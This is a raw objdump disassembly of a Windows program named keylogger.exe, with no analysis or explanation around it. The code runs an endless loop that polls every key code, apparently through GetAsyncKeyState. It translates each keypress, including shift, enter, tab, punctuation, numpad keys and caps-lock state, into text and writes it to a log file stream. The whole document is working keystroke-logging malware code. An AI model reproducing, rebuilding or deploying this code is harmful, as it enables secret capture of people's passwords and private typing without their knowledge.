
keylogger.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	cc                   	int3   
  401001:	cc                   	int3   
  401002:	cc                   	int3   
  401003:	cc                   	int3   
  401004:	cc                   	int3   
  401005:	e9 36 03 00 00       	jmp    0x401340
  40100a:	e9 11 00 00 00       	jmp    0x401020
  40100f:	cc                   	int3   
  401010:	cc                   	int3   
  401011:	cc                   	int3   
  401012:	cc                   	int3   
  401013:	cc                   	int3   
  401014:	cc                   	int3   
  401015:	cc                   	int3   
  401016:	cc                   	int3   
  401017:	cc                   	int3   
  401018:	cc                   	int3   
  401019:	cc                   	int3   
  40101a:	cc                   	int3   
  40101b:	cc                   	int3   
  40101c:	cc                   	int3   
  40101d:	cc                   	int3   
  40101e:	cc                   	int3   
  40101f:	cc                   	int3   
  401020:	55                   	push   %ebp
  401021:	8b ec                	mov    %esp,%ebp
  401023:	83 ec 40             	sub    $0x40,%esp
  401026:	53                   	push   %ebx
  401027:	56                   	push   %esi
  401028:	57                   	push   %edi
  401029:	8d 7d c0             	lea    -0x40(%ebp),%edi
  40102c:	b9 10 00 00 00       	mov    $0x10,%ecx
  401031:	b8 cc cc cc cc       	mov    $0xcccccccc,%eax
  401036:	f3 ab                	rep stos %eax,%es:(%edi)
  401038:	83 7d 08 20          	cmpl   $0x20,0x8(%ebp)
  40103c:	75 0d                	jne    0x40104b
  40103e:	68 a8 00 42 00       	push   $0x4200a8
  401043:	e8 28 04 00 00       	call   0x401470
  401048:	83 c4 04             	add    $0x4,%esp
  40104b:	83 7d 08 10          	cmpl   $0x10,0x8(%ebp)
  40104f:	75 0d                	jne    0x40105e
  401051:	68 9c 00 42 00       	push   $0x42009c
  401056:	e8 15 04 00 00       	call   0x401470
  40105b:	83 c4 04             	add    $0x4,%esp
  40105e:	83 7d 08 0d          	cmpl   $0xd,0x8(%ebp)
  401062:	75 0d                	jne    0x401071
  401064:	68 90 00 42 00       	push   $0x420090
  401069:	e8 02 04 00 00       	call   0x401470
  40106e:	83 c4 04             	add    $0x4,%esp
  401071:	83 7d 08 08          	cmpl   $0x8,0x8(%ebp)
  401075:	75 0d                	jne    0x401084
  401077:	68 80 00 42 00       	push   $0x420080
  40107c:	e8 ef 03 00 00       	call   0x401470
  401081:	83 c4 04             	add    $0x4,%esp
  401084:	83 7d 08 09          	cmpl   $0x9,0x8(%ebp)
  401088:	75 0d                	jne    0x401097
  40108a:	68 78 00 42 00       	push   $0x420078
  40108f:	e8 dc 03 00 00       	call   0x401470
  401094:	83 c4 04             	add    $0x4,%esp
  401097:	83 7d 08 11          	cmpl   $0x11,0x8(%ebp)
  40109b:	75 0d                	jne    0x4010aa
  40109d:	68 70 00 42 00       	push   $0x420070
  4010a2:	e8 c9 03 00 00       	call   0x401470
  4010a7:	83 c4 04             	add    $0x4,%esp
  4010aa:	83 7d 08 2e          	cmpl   $0x2e,0x8(%ebp)
  4010ae:	75 0d                	jne    0x4010bd
  4010b0:	68 68 00 42 00       	push   $0x420068
  4010b5:	e8 b6 03 00 00       	call   0x401470
  4010ba:	83 c4 04             	add    $0x4,%esp
  4010bd:	81 7d 08 bb 00 00 00 	cmpl   $0xbb,0x8(%ebp)
  4010c4:	75 0d                	jne    0x4010d3
  4010c6:	68 64 00 42 00       	push   $0x420064
  4010cb:	e8 a0 03 00 00       	call   0x401470
  4010d0:	83 c4 04             	add    $0x4,%esp
  4010d3:	81 7d 08 bc 00 00 00 	cmpl   $0xbc,0x8(%ebp)
  4010da:	75 0d                	jne    0x4010e9
  4010dc:	68 60 00 42 00       	push   $0x420060
  4010e1:	e8 8a 03 00 00       	call   0x401470
  4010e6:	83 c4 04             	add    $0x4,%esp
  4010e9:	81 7d 08 bd 00 00 00 	cmpl   $0xbd,0x8(%ebp)
  4010f0:	75 0d                	jne    0x4010ff
  4010f2:	68 5c 00 42 00       	push   $0x42005c
  4010f7:	e8 74 03 00 00       	call   0x401470
  4010fc:	83 c4 04             	add    $0x4,%esp
  4010ff:	81 7d 08 be 00 00 00 	cmpl   $0xbe,0x8(%ebp)
  401106:	74 06                	je     0x40110e
  401108:	83 7d 08 6e          	cmpl   $0x6e,0x8(%ebp)
  40110c:	75 0d                	jne    0x40111b
  40110e:	68 58 00 42 00       	push   $0x420058
  401113:	e8 58 03 00 00       	call   0x401470
  401118:	83 c4 04             	add    $0x4,%esp
  40111b:	83 7d 08 60          	cmpl   $0x60,0x8(%ebp)
  40111f:	75 0d                	jne    0x40112e
  401121:	68 54 00 42 00       	push   $0x420054
  401126:	e8 45 03 00 00       	call   0x401470
  40112b:	83 c4 04             	add    $0x4,%esp
  40112e:	83 7d 08 61          	cmpl   $0x61,0x8(%ebp)
  401132:	75 0d                	jne    0x401141
  401134:	68 50 00 42 00       	push   $0x420050
  401139:	e8 32 03 00 00       	call   0x401470
  40113e:	83 c4 04             	add    $0x4,%esp
  401141:	83 7d 08 62          	cmpl   $0x62,0x8(%ebp)
  401145:	75 0d                	jne    0x401154
  401147:	68 4c 00 42 00       	push   $0x42004c
  40114c:	e8 1f 03 00 00       	call   0x401470
  401151:	83 c4 04             	add    $0x4,%esp
  401154:	83 7d 08 63          	cmpl   $0x63,0x8(%ebp)
  401158:	75 0d                	jne    0x401167
  40115a:	68 48 00 42 00       	push   $0x420048
  40115f:	e8 0c 03 00 00       	call   0x401470
  401164:	83 c4 04             	add    $0x4,%esp
  401167:	83 7d 08 64          	cmpl   $0x64,0x8(%ebp)
  40116b:	75 0d                	jne    0x40117a
  40116d:	68 44 00 42 00       	push   $0x420044
  401172:	e8 f9 02 00 00       	call   0x401470
  401177:	83 c4 04             	add    $0x4,%esp
  40117a:	83 7d 08 65          	cmpl   $0x65,0x8(%ebp)
  40117e:	75 0d                	jne    0x40118d
  401180:	68 40 00 42 00       	push   $0x420040
  401185:	e8 e6 02 00 00       	call   0x401470
  40118a:	83 c4 04             	add    $0x4,%esp
  40118d:	83 7d 08 66          	cmpl   $0x66,0x8(%ebp)
  401191:	75 0d                	jne    0x4011a0
  401193:	68 3c 00 42 00       	push   $0x42003c
  401198:	e8 d3 02 00 00       	call   0x401470
  40119d:	83 c4 04             	add    $0x4,%esp
  4011a0:	83 7d 08 67          	cmpl   $0x67,0x8(%ebp)
  4011a4:	75 0d                	jne    0x4011b3
  4011a6:	68 38 00 42 00       	push   $0x420038
  4011ab:	e8 c0 02 00 00       	call   0x401470
  4011b0:	83 c4 04             	add    $0x4,%esp
  4011b3:	83 7d 08 68          	cmpl   $0x68,0x8(%ebp)
  4011b7:	75 0d                	jne    0x4011c6
  4011b9:	68 34 00 42 00       	push   $0x420034
  4011be:	e8 ad 02 00 00       	call   0x401470
  4011c3:	83 c4 04             	add    $0x4,%esp
  4011c6:	83 7d 08 69          	cmpl   $0x69,0x8(%ebp)
  4011ca:	75 0d                	jne    0x4011d9
  4011cc:	68 30 00 42 00       	push   $0x420030
  4011d1:	e8 9a 02 00 00       	call   0x401470
  4011d6:	83 c4 04             	add    $0x4,%esp
  4011d9:	83 7d 08 14          	cmpl   $0x14,0x8(%ebp)
  4011dd:	75 0d                	jne    0x4011ec
  4011df:	68 20 00 42 00       	push   $0x420020
  4011e4:	e8 87 02 00 00       	call   0x401470
  4011e9:	83 c4 04             	add    $0x4,%esp
  4011ec:	83 7d 08 60          	cmpl   $0x60,0x8(%ebp)
  4011f0:	7c 20                	jl     0x401212
  4011f2:	83 7d 08 69          	cmpl   $0x69,0x8(%ebp)
  4011f6:	7f 1a                	jg     0x401212
  4011f8:	8b 45 08             	mov    0x8(%ebp),%eax
  4011fb:	83 e8 30             	sub    $0x30,%eax
  4011fe:	89 45 08             	mov    %eax,0x8(%ebp)
  401201:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401204:	51                   	push   %ecx
  401205:	68 1c 00 42 00       	push   $0x42001c
  40120a:	e8 e1 01 00 00       	call   0x4013f0
  40120f:	83 c4 08             	add    $0x8,%esp
  401212:	83 7d 08 30          	cmpl   $0x30,0x8(%ebp)
  401216:	7c 17                	jl     0x40122f
  401218:	83 7d 08 3b          	cmpl   $0x3b,0x8(%ebp)
  40121c:	7f 11                	jg     0x40122f
  40121e:	8b 55 08             	mov    0x8(%ebp),%edx
  401221:	52                   	push   %edx
  401222:	68 1c 00 42 00       	push   $0x42001c
  401227:	e8 c4 01 00 00       	call   0x4013f0
  40122c:	83 c4 08             	add    $0x8,%esp
  40122f:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401233:	75 06                	jne    0x40123b
  401235:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  401239:	74 51                	je     0x40128c
  40123b:	83 7d 08 41          	cmpl   $0x41,0x8(%ebp)
  40123f:	7c 4b                	jl     0x40128c
  401241:	83 7d 08 5a          	cmpl   $0x5a,0x8(%ebp)
  401245:	7f 45                	jg     0x40128c
  401247:	8b f4                	mov    %esp,%esi
  401249:	6a 14                	push   $0x14
  40124b:	ff 15 94 52 42 00    	call   *0x425294
  401251:	3b f4                	cmp    %esp,%esi
  401253:	e8 08 03 00 00       	call   0x401560
  401258:	0f bf c0             	movswl %ax,%eax
  40125b:	85 c0                	test   %eax,%eax
  40125d:	74 13                	je     0x401272
  40125f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401262:	51                   	push   %ecx
  401263:	68 1c 00 42 00       	push   $0x42001c
  401268:	e8 83 01 00 00       	call   0x4013f0
  40126d:	83 c4 08             	add    $0x8,%esp
  401270:	eb 1a                	jmp    0x40128c
  401272:	8b 55 08             	mov    0x8(%ebp),%edx
  401275:	83 c2 20             	add    $0x20,%edx
  401278:	89 55 08             	mov    %edx,0x8(%ebp)
  40127b:	8b 45 08             	mov    0x8(%ebp),%eax
  40127e:	50                   	push   %eax
  40127f:	68 1c 00 42 00       	push   $0x42001c
  401284:	e8 67 01 00 00       	call   0x4013f0
  401289:	83 c4 08             	add    $0x8,%esp
  40128c:	5f                   	pop    %edi
  40128d:	5e                   	pop    %esi
  40128e:	5b                   	pop    %ebx
  40128f:	83 c4 40             	add    $0x40,%esp
  401292:	3b ec                	cmp    %esp,%ebp
  401294:	e8 c7 02 00 00       	call   0x401560
  401299:	8b e5                	mov    %ebp,%esp
  40129b:	5d                   	pop    %ebp
  40129c:	c3                   	ret    
  40129d:	cc                   	int3   
  40129e:	cc                   	int3   
  40129f:	cc                   	int3   
  4012a0:	cc                   	int3   
  4012a1:	cc                   	int3   
  4012a2:	cc                   	int3   
  4012a3:	cc                   	int3   
  4012a4:	cc                   	int3   
  4012a5:	cc                   	int3   
  4012a6:	cc                   	int3   
  4012a7:	cc                   	int3   
  4012a8:	cc                   	int3   
  4012a9:	cc                   	int3   
  4012aa:	cc                   	int3   
  4012ab:	cc                   	int3   
  4012ac:	cc                   	int3   
  4012ad:	cc                   	int3   
  4012ae:	cc                   	int3   
  4012af:	cc                   	int3   
  4012b0:	cc                   	int3   
  4012b1:	cc                   	int3   
  4012b2:	cc                   	int3   
  4012b3:	cc                   	int3   
  4012b4:	cc                   	int3   
  4012b5:	cc                   	int3   
  4012b6:	cc                   	int3   
  4012b7:	cc                   	int3   
  4012b8:	cc                   	int3   
  4012b9:	cc                   	int3   
  4012ba:	cc                   	int3   
  4012bb:	cc                   	int3   
  4012bc:	cc                   	int3   
  4012bd:	cc                   	int3   
  4012be:	cc                   	int3   
  4012bf:	cc                   	int3   
  4012c0:	cc                   	int3   
  4012c1:	cc                   	int3   
  4012c2:	cc                   	int3   
  4012c3:	cc                   	int3   
  4012c4:	cc                   	int3   
  4012c5:	cc                   	int3   
  4012c6:	cc                   	int3   
  4012c7:	cc                   	int3   
  4012c8:	cc                   	int3   
  4012c9:	cc                   	int3   
  4012ca:	cc                   	int3   
  4012cb:	cc                   	int3   
  4012cc:	cc                   	int3   
  4012cd:	cc                   	int3   
  4012ce:	cc                   	int3   
  4012cf:	cc                   	int3   
  4012d0:	cc                   	int3   
  4012d1:	cc                   	int3   
  4012d2:	cc                   	int3   
  4012d3:	cc                   	int3   
  4012d4:	cc                   	int3   
  4012d5:	cc                   	int3   
  4012d6:	cc                   	int3   
  4012d7:	cc                   	int3   
  4012d8:	cc                   	int3   
  4012d9:	cc                   	int3   
  4012da:	cc                   	int3   
  4012db:	cc                   	int3   
  4012dc:	cc                   	int3   
  4012dd:	cc                   	int3   
  4012de:	cc                   	int3   
  4012df:	cc                   	int3   
  4012e0:	cc                   	int3   
  4012e1:	cc                   	int3   
  4012e2:	cc                   	int3   
  4012e3:	cc                   	int3   
  4012e4:	cc                   	int3   
  4012e5:	cc                   	int3   
  4012e6:	cc                   	int3   
  4012e7:	cc                   	int3   
  4012e8:	cc                   	int3   
  4012e9:	cc                   	int3   
  4012ea:	cc                   	int3   
  4012eb:	cc                   	int3   
  4012ec:	cc                   	int3   
  4012ed:	cc                   	int3   
  4012ee:	cc                   	int3   
  4012ef:	cc                   	int3   
  4012f0:	cc                   	int3   
  4012f1:	cc                   	int3   
  4012f2:	cc                   	int3   
  4012f3:	cc                   	int3   
  4012f4:	cc                   	int3   
  4012f5:	cc                   	int3   
  4012f6:	cc                   	int3   
  4012f7:	cc                   	int3   
  4012f8:	cc                   	int3   
  4012f9:	cc                   	int3   
  4012fa:	cc                   	int3   
  4012fb:	cc                   	int3   
  4012fc:	cc                   	int3   
  4012fd:	cc                   	int3   
  4012fe:	cc                   	int3   
  4012ff:	cc                   	int3   
  401300:	cc                   	int3   
  401301:	cc                   	int3   
  401302:	cc                   	int3   
  401303:	cc                   	int3   
  401304:	cc                   	int3   
  401305:	cc                   	int3   
  401306:	cc                   	int3   
  401307:	cc                   	int3   
  401308:	cc                   	int3   
  401309:	cc                   	int3   
  40130a:	cc                   	int3   
  40130b:	cc                   	int3   
  40130c:	cc                   	int3   
  40130d:	cc                   	int3   
  40130e:	cc                   	int3   
  40130f:	cc                   	int3   
  401310:	cc                   	int3   
  401311:	cc                   	int3   
  401312:	cc                   	int3   
  401313:	cc                   	int3   
  401314:	cc                   	int3   
  401315:	cc                   	int3   
  401316:	cc                   	int3   
  401317:	cc                   	int3   
  401318:	cc                   	int3   
  401319:	cc                   	int3   
  40131a:	cc                   	int3   
  40131b:	cc                   	int3   
  40131c:	cc                   	int3   
  40131d:	cc                   	int3   
  40131e:	cc                   	int3   
  40131f:	cc                   	int3   
  401320:	cc                   	int3   
  401321:	cc                   	int3   
  401322:	cc                   	int3   
  401323:	cc                   	int3   
  401324:	cc                   	int3   
  401325:	cc                   	int3   
  401326:	cc                   	int3   
  401327:	cc                   	int3   
  401328:	cc                   	int3   
  401329:	cc                   	int3   
  40132a:	cc                   	int3   
  40132b:	cc                   	int3   
  40132c:	cc                   	int3   
  40132d:	cc                   	int3   
  40132e:	cc                   	int3   
  40132f:	cc                   	int3   
  401330:	cc                   	int3   
  401331:	cc                   	int3   
  401332:	cc                   	int3   
  401333:	cc                   	int3   
  401334:	cc                   	int3   
  401335:	cc                   	int3   
  401336:	cc                   	int3   
  401337:	cc                   	int3   
  401338:	cc                   	int3   
  401339:	cc                   	int3   
  40133a:	cc                   	int3   
  40133b:	cc                   	int3   
  40133c:	cc                   	int3   
  40133d:	cc                   	int3   
  40133e:	cc                   	int3   
  40133f:	cc                   	int3   
  401340:	55                   	push   %ebp
  401341:	8b ec                	mov    %esp,%ebp
  401343:	83 ec 44             	sub    $0x44,%esp
  401346:	53                   	push   %ebx
  401347:	56                   	push   %esi
  401348:	57                   	push   %edi
  401349:	8d 7d bc             	lea    -0x44(%ebp),%edi
  40134c:	b9 11 00 00 00       	mov    $0x11,%ecx
  401351:	b8 cc cc cc cc       	mov    $0xcccccccc,%eax
  401356:	f3 ab                	rep stos %eax,%es:(%edi)
  401358:	b8 01 00 00 00       	mov    $0x1,%eax
  40135d:	85 c0                	test   %eax,%eax
  40135f:	74 4b                	je     0x4013ac
  401361:	c6 45 fc 08          	movb   $0x8,-0x4(%ebp)
  401365:	eb 09                	jmp    0x401370
  401367:	8a 4d fc             	mov    -0x4(%ebp),%cl
  40136a:	80 c1 01             	add    $0x1,%cl
  40136d:	88 4d fc             	mov    %cl,-0x4(%ebp)
  401370:	0f be 55 fc          	movsbl -0x4(%ebp),%edx
  401374:	81 fa be 00 00 00    	cmp    $0xbe,%edx
  40137a:	7f 2e                	jg     0x4013aa
  40137c:	0f be 45 fc          	movsbl -0x4(%ebp),%eax
  401380:	8b f4                	mov    %esp,%esi
  401382:	50                   	push   %eax
  401383:	ff 15 90 52 42 00    	call   *0x425290
  401389:	3b f4                	cmp    %esp,%esi
  40138b:	e8 d0 01 00 00       	call   0x401560
  401390:	0f bf c8             	movswl %ax,%ecx
  401393:	81 f9 01 80 ff ff    	cmp    $0xffff8001,%ecx
  401399:	75 0d                	jne    0x4013a8
  40139b:	0f be 55 fc          	movsbl -0x4(%ebp),%edx
  40139f:	52                   	push   %edx
  4013a0:	e8 65 fc ff ff       	call   0x40100a
  4013a5:	83 c4 04             	add    $0x4,%esp
  4013a8:	eb bd                	jmp    0x401367
  4013aa:	eb ac                	jmp    0x401358
  4013ac:	5f                   	pop    %edi
  4013ad:	5e                   	pop    %esi
  4013ae:	5b                   	pop    %ebx
  4013af:	83 c4 44             	add    $0x44,%esp
  4013b2:	3b ec                	cmp    %esp,%ebp
  4013b4:	e8 a7 01 00 00       	call   0x401560
  4013b9:	8b e5                	mov    %ebp,%esp
  4013bb:	5d                   	pop    %ebp
  4013bc:	c3                   	ret    
  4013bd:	cc                   	int3   
  4013be:	cc                   	int3   
  4013bf:	cc                   	int3   
  4013c0:	cc                   	int3   
  4013c1:	cc                   	int3   
  4013c2:	cc                   	int3   
  4013c3:	cc                   	int3   
  4013c4:	cc                   	int3   
  4013c5:	cc                   	int3   
  4013c6:	cc                   	int3   
  4013c7:	cc                   	int3   
  4013c8:	cc                   	int3   
  4013c9:	cc                   	int3   
  4013ca:	cc                   	int3   
  4013cb:	cc                   	int3   
  4013cc:	cc                   	int3   
  4013cd:	cc                   	int3   
  4013ce:	cc                   	int3   
  4013cf:	cc                   	int3   
  4013d0:	cc                   	int3   
  4013d1:	cc                   	int3   
  4013d2:	cc                   	int3   
  4013d3:	cc                   	int3   
  4013d4:	cc                   	int3   
  4013d5:	cc                   	int3   
  4013d6:	cc                   	int3   
  4013d7:	cc                   	int3   
  4013d8:	cc                   	int3   
  4013d9:	cc                   	int3   
  4013da:	cc                   	int3   
  4013db:	cc                   	int3   
  4013dc:	ff 25 94 52 42 00    	jmp    *0x425294
  4013e2:	ff 25 90 52 42 00    	jmp    *0x425290
  4013e8:	cc                   	int3   
  4013e9:	cc                   	int3   
  4013ea:	cc                   	int3   
  4013eb:	cc                   	int3   
  4013ec:	cc                   	int3   
  4013ed:	cc                   	int3   
  4013ee:	cc                   	int3   
  4013ef:	cc                   	int3   
  4013f0:	55                   	push   %ebp
  4013f1:	8b ec                	mov    %esp,%ebp
  4013f3:	83 ec 0c             	sub    $0xc,%esp
  4013f6:	53                   	push   %ebx
  4013f7:	56                   	push   %esi
  4013f8:	57                   	push   %edi
  4013f9:	8d 45 0c             	lea    0xc(%ebp),%eax
  4013fc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4013ff:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401403:	75 1e                	jne    0x401423
  401405:	68 b8 00 42 00       	push   $0x4200b8
  40140a:	6a 00                	push   $0x0
  40140c:	6a 36                	push   $0x36
  40140e:	68 ac 00 42 00       	push   $0x4200ac
  401413:	6a 02                	push   $0x2
  401415:	e8 36 16 00 00       	call   0x402a50
  40141a:	83 c4 14             	add    $0x14,%esp
  40141d:	83 f8 01             	cmp    $0x1,%eax
  401420:	75 01                	jne    0x401423
  401422:	cc                   	int3   
  401423:	33 c9                	xor    %ecx,%ecx
  401425:	85 c9                	test   %ecx,%ecx
  401427:	75 d6                	jne    0x4013ff
  401429:	68 60 2a 42 00       	push   $0x422a60
  40142e:	e8 fd 02 00 00       	call   0x401730
  401433:	83 c4 04             	add    $0x4,%esp
  401436:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401439:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40143c:	52                   	push   %edx
  40143d:	8b 45 08             	mov    0x8(%ebp),%eax
  401440:	50                   	push   %eax
  401441:	68 60 2a 42 00       	push   $0x422a60
  401446:	e8 05 05 00 00       	call   0x401950
  40144b:	83 c4 0c             	add    $0xc,%esp
  40144e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401451:	68 60 2a 42 00       	push   $0x422a60
  401456:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401459:	51                   	push   %ecx
  40145a:	e8 31 04 00 00       	call   0x401890
  40145f:	83 c4 08             	add    $0x8,%esp
  401462:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401465:	5f                   	pop    %edi
  401466:	5e                   	pop    %esi
  401467:	5b                   	pop    %ebx
  401468:	8b e5                	mov    %ebp,%esp
  40146a:	5d                   	pop    %ebp
  40146b:	c3                   	ret    
  40146c:	cc                   	int3   
  40146d:	cc                   	int3   
  40146e:	cc                   	int3   
  40146f:	cc                   	int3   
  401470:	55                   	push   %ebp
  401471:	8b ec                	mov    %esp,%ebp
  401473:	83 ec 14             	sub    $0x14,%esp
  401476:	53                   	push   %ebx
  401477:	56                   	push   %esi
  401478:	57                   	push   %edi
  401479:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  401480:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401484:	75 1e                	jne    0x4014a4
  401486:	68 d0 00 42 00       	push   $0x4200d0
  40148b:	6a 00                	push   $0x0
  40148d:	6a 31                	push   $0x31
  40148f:	68 c8 00 42 00       	push   $0x4200c8
  401494:	6a 02                	push   $0x2
  401496:	e8 b5 15 00 00       	call   0x402a50
  40149b:	83 c4 14             	add    $0x14,%esp
  40149e:	83 f8 01             	cmp    $0x1,%eax
  4014a1:	75 01                	jne    0x4014a4
  4014a3:	cc                   	int3   
  4014a4:	33 c0                	xor    %eax,%eax
  4014a6:	85 c0                	test   %eax,%eax
  4014a8:	75 d6                	jne    0x401480
  4014aa:	68 60 2a 42 00       	push   $0x422a60
  4014af:	e8 7c 02 00 00       	call   0x401730
  4014b4:	83 c4 04             	add    $0x4,%esp
  4014b7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4014ba:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4014bd:	51                   	push   %ecx
  4014be:	e8 cd 20 00 00       	call   0x403590
  4014c3:	83 c4 04             	add    $0x4,%esp
  4014c6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4014c9:	68 60 2a 42 00       	push   $0x422a60
  4014ce:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4014d1:	52                   	push   %edx
  4014d2:	6a 01                	push   $0x1
  4014d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4014d7:	50                   	push   %eax
  4014d8:	e8 93 1e 00 00       	call   0x403370
  4014dd:	83 c4 10             	add    $0x10,%esp
  4014e0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4014e3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4014e6:	3b 4d fc             	cmp    -0x4(%ebp),%ecx
  4014e9:	75 58                	jne    0x401543
  4014eb:	8b 15 64 2a 42 00    	mov    0x422a64,%edx
  4014f1:	83 ea 01             	sub    $0x1,%edx
  4014f4:	89 15 64 2a 42 00    	mov    %edx,0x422a64
  4014fa:	83 3d 64 2a 42 00 00 	cmpl   $0x0,0x422a64
  401501:	7c 27                	jl     0x40152a
  401503:	a1 60 2a 42 00       	mov    0x422a60,%eax
  401508:	c6 00 0a             	movb   $0xa,(%eax)
  40150b:	b9 0a 00 00 00       	mov    $0xa,%ecx
  401510:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  401516:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401519:	8b 15 60 2a 42 00    	mov    0x422a60,%edx
  40151f:	83 c2 01             	add    $0x1,%edx
  401522:	89 15 60 2a 42 00    	mov    %edx,0x422a60
  401528:	eb 12                	jmp    0x40153c
  40152a:	68 60 2a 42 00       	push   $0x422a60
  40152f:	6a 0a                	push   $0xa
  401531:	e8 ba 1b 00 00       	call   0x4030f0
  401536:	83 c4 08             	add    $0x8,%esp
  401539:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40153c:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401543:	68 60 2a 42 00       	push   $0x422a60
  401548:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40154b:	50                   	push   %eax
  40154c:	e8 3f 03 00 00       	call   0x401890
  401551:	83 c4 08             	add    $0x8,%esp
  401554:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401557:	5f                   	pop    %edi
  401558:	5e                   	pop    %esi
  401559:	5b                   	pop    %ebx
  40155a:	8b e5                	mov    %ebp,%esp
  40155c:	5d                   	pop    %ebp
  40155d:	c3                   	ret    
  40155e:	cc                   	int3   
  40155f:	cc                   	int3   
  401560:	75 01                	jne    0x401563
  401562:	c3                   	ret    
  401563:	55                   	push   %ebp
  401564:	8b ec                	mov    %esp,%ebp
  401566:	83 ec 00             	sub    $0x0,%esp
  401569:	50                   	push   %eax
  40156a:	52                   	push   %edx
  40156b:	53                   	push   %ebx
  40156c:	56                   	push   %esi
  40156d:	57                   	push   %edi
  40156e:	68 f4 00 42 00       	push   $0x4200f4
  401573:	68 f0 00 42 00       	push   $0x4200f0
  401578:	6a 2a                	push   $0x2a
  40157a:	68 e0 00 42 00       	push   $0x4200e0
  40157f:	6a 01                	push   $0x1
  401581:	e8 ca 14 00 00       	call   0x402a50
  401586:	83 c4 14             	add    $0x14,%esp
  401589:	83 f8 01             	cmp    $0x1,%eax
  40158c:	75 01                	jne    0x40158f
  40158e:	cc                   	int3   
  40158f:	5f                   	pop    %edi
  401590:	5e                   	pop    %esi
  401591:	5b                   	pop    %ebx
  401592:	5a                   	pop    %edx
  401593:	58                   	pop    %eax
  401594:	8b e5                	mov    %ebp,%esp
  401596:	5d                   	pop    %ebp
  401597:	c3                   	ret    
  401598:	cc                   	int3   
  401599:	cc                   	int3   
  40159a:	cc                   	int3   
  40159b:	cc                   	int3   
  40159c:	cc                   	int3   
  40159d:	cc                   	int3   
  40159e:	cc                   	int3   
  40159f:	cc                   	int3   
  4015a0:	55                   	push   %ebp
  4015a1:	8b ec                	mov    %esp,%ebp
  4015a3:	6a ff                	push   $0xffffffff
  4015a5:	68 d0 01 42 00       	push   $0x4201d0
  4015aa:	68 c4 47 40 00       	push   $0x4047c4
  4015af:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4015b5:	50                   	push   %eax
  4015b6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4015bd:	83 c4 f0             	add    $0xfffffff0,%esp
  4015c0:	53                   	push   %ebx
  4015c1:	56                   	push   %esi
  4015c2:	57                   	push   %edi
  4015c3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4015c6:	ff 15 90 51 42 00    	call   *0x425190
  4015cc:	a3 d8 35 42 00       	mov    %eax,0x4235d8
  4015d1:	a1 d8 35 42 00       	mov    0x4235d8,%eax
  4015d6:	c1 e8 08             	shr    $0x8,%eax
  4015d9:	25 ff 00 00 00       	and    $0xff,%eax
  4015de:	a3 e4 35 42 00       	mov    %eax,0x4235e4
  4015e3:	8b 0d d8 35 42 00    	mov    0x4235d8,%ecx
  4015e9:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4015ef:	89 0d e0 35 42 00    	mov    %ecx,0x4235e0
  4015f5:	8b 15 e0 35 42 00    	mov    0x4235e0,%edx
  4015fb:	c1 e2 08             	shl    $0x8,%edx
  4015fe:	03 15 e4 35 42 00    	add    0x4235e4,%edx
  401604:	89 15 dc 35 42 00    	mov    %edx,0x4235dc
  40160a:	a1 d8 35 42 00       	mov    0x4235d8,%eax
  40160f:	c1 e8 10             	shr    $0x10,%eax
  401612:	25 ff ff 00 00       	and    $0xffff,%eax
  401617:	a3 d8 35 42 00       	mov    %eax,0x4235d8
  40161c:	6a 00                	push   $0x0
  40161e:	e8 bd 2f 00 00       	call   0x4045e0
  401623:	83 c4 04             	add    $0x4,%esp
  401626:	85 c0                	test   %eax,%eax
  401628:	75 0a                	jne    0x401634
  40162a:	6a 1c                	push   $0x1c
  40162c:	e8 cf 00 00 00       	call   0x401700
  401631:	83 c4 04             	add    $0x4,%esp
  401634:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40163b:	e8 30 2c 00 00       	call   0x404270
  401640:	ff 15 8c 51 42 00    	call   *0x42518c
  401646:	a3 24 4f 42 00       	mov    %eax,0x424f24
  40164b:	e8 00 2a 00 00       	call   0x404050
  401650:	a3 b0 35 42 00       	mov    %eax,0x4235b0
  401655:	e8 e6 24 00 00       	call   0x403b40
  40165a:	e8 91 23 00 00       	call   0x4039f0
  40165f:	e8 ac 1f 00 00       	call   0x403610
  401664:	8b 0d f4 35 42 00    	mov    0x4235f4,%ecx
  40166a:	89 0d f8 35 42 00    	mov    %ecx,0x4235f8
  401670:	8b 15 f4 35 42 00    	mov    0x4235f4,%edx
  401676:	52                   	push   %edx
  401677:	a1 ec 35 42 00       	mov    0x4235ec,%eax
  40167c:	50                   	push   %eax
  40167d:	8b 0d e8 35 42 00    	mov    0x4235e8,%ecx
  401683:	51                   	push   %ecx
  401684:	e8 7c f9 ff ff       	call   0x401005
  401689:	83 c4 0c             	add    $0xc,%esp
  40168c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40168f:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401692:	52                   	push   %edx
  401693:	e8 b8 1f 00 00       	call   0x403650
  401698:	8b 45 ec             	mov    -0x14(%ebp),%eax
